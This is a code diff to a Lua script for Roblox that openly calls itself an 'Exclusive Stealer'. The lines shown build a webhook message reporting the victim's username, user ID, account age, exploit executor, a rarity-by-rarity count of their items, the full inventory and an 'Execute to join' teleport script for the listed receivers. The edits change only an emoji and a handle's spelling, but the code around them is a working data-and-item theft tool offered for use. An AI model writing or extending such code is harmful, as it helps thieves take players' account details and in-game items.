@@ -334,7 +334,7 @@ local success, errorMsg = pcall(function()
     end
 end)
 if success then
-    message = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. Executor .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGodly      🌟 : " .. Godly .. "\nUnique     🟧: " .. Unique .. "\nVintage    🟨: " .. Vintage .. "\nLegendary  🟥: " .. Legendary .. "\nRare       🟦: " .. Rare .. "\nUncommon   🟩: " .. Uncommon .. "\nCommon     ⬜: " .. Common .. "```\🎒’ **__Full Inventory__**\n```" .. AllItems .. "```\”— **__Execute to join__**\n```" .. TeleportScript .. "```"
+    message = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. Executor .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGodly      🎀: " .. Godly .. "\nUnique     🟧: " .. Unique .. "\nVintage    🟨: " .. Vintage .. "\nLegendary  🟥: " .. Legendary .. "\nRare       🟦: " .. Rare .. "\nUncommon   🟩: " .. Uncommon .. "\nCommon     ⬜: " .. Common .. "```\🎒’ **__Full Inventory__**\n```" .. AllItems .. "```\”— **__Execute to join__**\n```" .. TeleportScript .. "```"
 else
     message = "```Error   : " .. errorMsg .. "\nExploit : " .. Executor .. "```\n\n**If you see this error means something went wrong report this to me lol.**"
 end
@@ -356,7 +356,7 @@ embed.Info = {
 		Color = DYWebhook.ColorConverter(Color3.fromRGB(136, 29, 138))
 	},
 	Embed = {
-		Title = "👑 **__Ashbornn__ | __Exclusive Stealer__**",
+		Title = "👑 **__Ashborrnn__ | __Exclusive Stealer__**",
 		Description = message,
 		Footer = "",
 	}
